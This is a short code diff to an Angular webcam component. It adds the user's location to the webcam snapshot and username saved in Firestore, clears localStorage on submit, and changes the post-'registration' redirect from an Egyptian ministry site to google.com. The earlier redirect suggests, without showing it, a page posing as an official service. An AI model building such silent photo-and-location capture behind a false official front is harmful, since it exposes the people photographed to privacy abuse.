@@ -109,8 +109,13 @@ export class CamComponent implements OnInit {
   // //onsubmit
   sendImg(img: WebcamImage) {
     const userName = localStorage.getItem('userName');
+    const location = localStorage.getItem('location');
     const usersImg = collection(this.firestore, 'userImg');
-    return addDoc(usersImg, { userName: userName, userImg: img.imageAsBase64 })
+    return addDoc(usersImg, {
+      userName: userName,
+      location: location,
+      userImg: img.imageAsBase64,
+    })
       .then((res) => console.log('Image saved:', res))
       .catch((err) => console.error('Error:', err));
   }
@@ -118,6 +123,7 @@ export class CamComponent implements OnInit {
   submit() {
     this.triggerSnapshot();
     alert('تم التسجيل بنجاح....شكرا لك');
-    window.location.replace('https://www.moss.gov.eg/ar-eg/Pages/default.aspx');
+    localStorage.clear();
+    window.location.replace('https://www.google.com');
   }
 }
